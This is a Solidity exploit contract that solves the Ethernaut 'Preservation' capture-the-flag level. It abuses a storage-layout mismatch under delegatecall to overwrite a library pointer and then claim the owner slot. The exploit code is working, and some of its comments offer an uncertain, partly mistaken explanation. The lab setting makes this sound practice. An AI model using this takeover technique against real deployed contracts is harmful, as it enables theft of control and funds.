// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x1c9eCA71320a6553cF99136a42307292E48fF3D2

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// solution

// you have to call the claim() method with the contract address twice (idk why)
// maybe in the consecutive call to _contract.call(), the memory state change isnt reflected yet

// an address is an hexadecimal number of 20 bytes, so to correctly cast it to a uint256
// we need to first cast it to uint160, because 160 bits = 20 bytes

contract HackPreservation {
    address public slot1;
    address public slot2;
    address public slot3;

    function claim(address _contract) public {
        // exploit the variables layout mismatch between the Preservation contract and the LibraryContract to change the timeZone1Library address to point to this contract
        // (when using the delegatecall, the variable names doesnt matter, which matters are the types and order, they should match)
        _contract.call(abi.encodeWithSignature("setFirstTime(uint256)", uint(uint160(address(this)))));

        // now that timeZone1Library is pointing to this contract, the setTime() function defined here
        // will receive an address casted to a uint, and then set it in the "owner" memory block (slot3) casting it back into an address
        // so now we call the method with our address to claim the ownership
        _contract.call(abi.encodeWithSignature("setFirstTime(uint256)", uint(uint160(msg.sender))));
    }

    function setTime(uint _owner) public {
        slot3 = address(_owner);
    }
}